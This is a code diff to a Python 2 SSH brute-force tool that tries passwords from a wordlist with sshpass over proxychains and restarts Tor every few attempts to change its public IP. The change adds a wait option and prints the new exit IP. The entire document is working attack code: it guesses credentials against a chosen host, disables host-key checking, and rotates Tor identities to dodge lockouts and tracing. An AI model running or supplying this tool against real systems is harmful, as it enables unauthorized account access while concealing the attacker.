@@ -25,7 +25,7 @@ CONTACTS:
 	- neetx@protonmail.com
 """
 
-import os, sys, argparse
+import os, sys, argparse, time
 from dependences import manage_dependences
 from validators import (
 	ipValidator,
@@ -73,6 +73,7 @@ def argvcontrol():
 	parser.add_argument("-i","--ip", help="Destination ip address", default="127.0.0.1")
 	parser.add_argument("-p","--port", help="Destination port", default="22")
 	parser.add_argument("-a","--attempts", help="Number of attempts before identity change", default="3")
+	parser.add_argument("-w","--wait", help="Waiting time after Tor service restart", default=1)
 	parser.add_argument("-t","--test", help="Use the to test dependences", action='store_true', default=False)
 	args = parser.parse_args()
 
@@ -114,18 +115,27 @@ def main():
 			port = check[1].port
 			wordlist = check[1].wordlist
 			attempts = int(check[1].attempts)
+			wait = int(check[1].wait)
 			
 			f = open(wordlist)
 			c = 0
 
 			os.system('service tor restart')
+			print '[*] Public IP changed to:'
+			time.sleep(wait)
+			os.system('proxychains -q curl https://ipinfo.io/ip')
+			print
 
 
 			for line in f:
 				if(c == attempts):
 					c = 0
 					os.system('service tor reload')
-					print '[*] Ip changed !'
+					print '[*] Public IP changed to:'
+					time.sleep(wait)
+					os.system('proxychains -q curl https://ipinfo.io/ip')
+					print
+
 				print 'We\' re trying with: ' + line
 				var = 'proxychains sshpass -p ' + line[:-1] + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip + ' -p ' + port
 				os.system(var)
